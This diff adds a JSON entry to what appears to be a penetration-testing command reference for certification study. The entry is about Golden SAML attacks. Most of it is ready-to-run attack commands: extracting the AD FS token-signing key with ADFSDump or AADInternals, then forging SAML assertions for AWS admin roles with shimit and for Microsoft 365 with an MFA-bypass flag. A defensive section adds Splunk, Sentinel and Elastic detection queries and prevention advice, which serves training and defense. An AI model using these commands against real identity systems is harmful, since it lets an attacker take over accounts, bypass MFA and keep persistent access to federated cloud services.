@@ -1,0 +1,105 @@
+{
+  "id": "cloud-golden-saml",
+  "name": "Golden SAML - Forge Federated Authentication Tokens",
+  "command": "python3 shimit.py -idp <idp_entity_id> -pk key.pem -c cert.pem -u <user> -n <user>",
+  "description": "Golden SAML forges SAML authentication responses by stealing the AD FS (or other IdP) token-signing private key. With that key an attacker mints SAML assertions for ANY user with ANY privileges to any federated service (Microsoft 365, AWS, etc.), bypassing MFA and password changes. The cloud analog of a Golden Ticket; a key technique in SolarWinds-style intrusions.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "quiet",
+  "category": "Cloud Security",
+  "subcategory": "Federation Attacks",
+  "certifications": [
+    "MCRTA",
+    "CRTP"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "CyberArk shimit; mandiant/ADFSDump; AADInternals",
+  "tags": [
+    "golden-saml",
+    "saml",
+    "adfs",
+    "federation",
+    "token-signing",
+    "mfa-bypass",
+    "persistence"
+  ],
+  "mitre": [
+    "T1606.002",
+    "T1552.004"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== 1. STEAL THE AD FS TOKEN-SIGNING KEY (on AD FS server / as DKM reader) ===\n  # Extract the private key + config (needs AD FS service account / DKM key):\n  ADFSDump.exe\n  # Or with AADInternals (PowerShell):\n  Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx\n\n=== 2. FORGE A SAML RESPONSE (shimit) ===\n  python3 shimit.py -idp http://<adfs_fqdn>/adfs/services/trust \\\n    -pk key.pem -c cert.pem -u <user>@<domain> -n <user> \\\n    -se \"https://signin.aws.amazon.com/saml\" -r <role_arn>\n  # Produces a signed assertion accepted by the SP without IdP interaction\n\n=== 3. OR FORGE WITH AADInternals (M365/Entra) ===\n  Open-AADIntOffice365Portal -ImmutableID <id> -UseBuiltInCertificate \\\n    -ByPassMFA $true -Issuer \"http://<adfs_fqdn>/adfs/services/trust\"\n\n=== WHY IT IS DEVASTATING ===\n  # - Works for ANY user/role, ANY privilege\n  # - Bypasses MFA and password resets (signature is all the SP checks)\n  # - Survives until the token-signing cert is rotated (persistence)\n\n=== PREREQUISITE ACCESS ===\n  # AD FS service account, DKM master key (AD container), or the signing cert itself\n\n=== ALTERNATIVES / RELATED ===\n  # Golden Ticket (on-prem Kerberos) - analogous krbtgt forgery\n  # Cloud token theft / app credential abuse",
+  "examples": [
+    {
+      "label": "Dump AD FS signing key",
+      "command": "Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx"
+    },
+    {
+      "label": "Forge SAML for AWS (shimit)",
+      "command": "python3 shimit.py -idp http://adfs.corp.com/adfs/services/trust -pk key.pem -c cert.pem -u admin@corp.com -n admin -se \"https://signin.aws.amazon.com/saml\" -r arn:aws:iam::111122223333:role/Admin"
+    },
+    {
+      "label": "Forge M365 access (AADInternals)",
+      "command": "Open-AADIntOffice365Portal -ImmutableID abc== -UseBuiltInCertificate -ByPassMFA $true -Issuer \"http://adfs.corp.com/adfs/services/trust\""
+    }
+  ],
+  "references": [
+    {
+      "title": "CyberArk - Golden SAML",
+      "url": "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps"
+    },
+    {
+      "title": "MITRE T1606.002 - Forge SAML Tokens",
+      "url": "https://attack.mitre.org/techniques/T1606/002/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-golden-ticket-mimikatz",
+      "note": "Golden Ticket is the on-prem Kerberos analog.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cloud-azurehound",
+      "note": "Map federation/trust relationships to find AD FS.",
+      "rel": "prereq"
+    },
+    {
+      "id": "azure-app-credential-abuse",
+      "note": "App/SP credential abuse is another cloud persistence path.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Service providers trust any SAML assertion signed by the IdP token-signing key. If an attacker steals that private key, they can sign assertions for any identity with any attributes/roles - the SP never contacts the IdP to verify.",
+    "prerequisites": "Access to the AD FS token-signing private key (via AD FS service account, the DKM master key in AD, or the exported cert).",
+    "impact": "Unlimited, MFA-bypassing, password-reset-surviving access to all federated services (M365, AWS, etc.) as any user; long-term persistence.",
+    "detection": "[MITRE T1606.002/T1552.004] SAML logons with no corresponding AD FS sign-in event; assertions with unusual validity/attributes; AD FS DKM/key access; sign-ins from forged tokens (odd IssuerInstant, no MFA claim yet MFA required).",
+    "artifacts": "Mismatch between SP sign-in logs and IdP 1200/1202 events; ADFSDump/AADInternals usage; access to the DKM container / signing cert.",
+    "splunk_spl": "index=o365 OR index=azure Operation=UserLoggedIn\n| join type=left [search index=adfs EventCode=1200]\n| where isnull(adfs_event)\n| table _time, UserId, ClientIP",
+    "elastic_kql": "azure.signinlogs.properties.authentication_protocol:saml and not event.provider:\"AD FS Auditing\"",
+    "sentinel_kql": "SigninLogs\n| where AuthenticationProtocol == \"saml\"\n| join kind=leftanti (ADFSSignInLogs | project CorrelationId) on CorrelationId\n| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName",
+    "sigma_rules": "cloud_golden_saml_forged_token",
+    "prevention": "Protect/rotate AD FS token-signing keys (HSM); restrict DKM key readers; treat AD FS as Tier-0; monitor for key export; prefer cloud-native auth over on-prem federation; alert on SP logons lacking IdP events.",
+    "sources": [
+      "CyberArk",
+      "https://attack.mitre.org/techniques/T1606/002/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Federated logon without matching AD FS sign-in (Golden SAML)",
+        "logic": "SigninLogs\n| where ResultType == 0 and AuthenticationProtocol == \"saml\"\n| join kind=leftanti (ADFSSignInLogs | project CorrelationId) on CorrelationId\n| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName",
+        "data_source": "entra-id",
+        "attack": [
+          "T1606.002",
+          "T1552.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Log ingestion gaps between SP and IdP; non-AD FS IdPs",
+        "tuning": "Requires correlating SP sign-ins with IdP events; baseline normal federation flow"
+      }
+    ]
+  }
+}
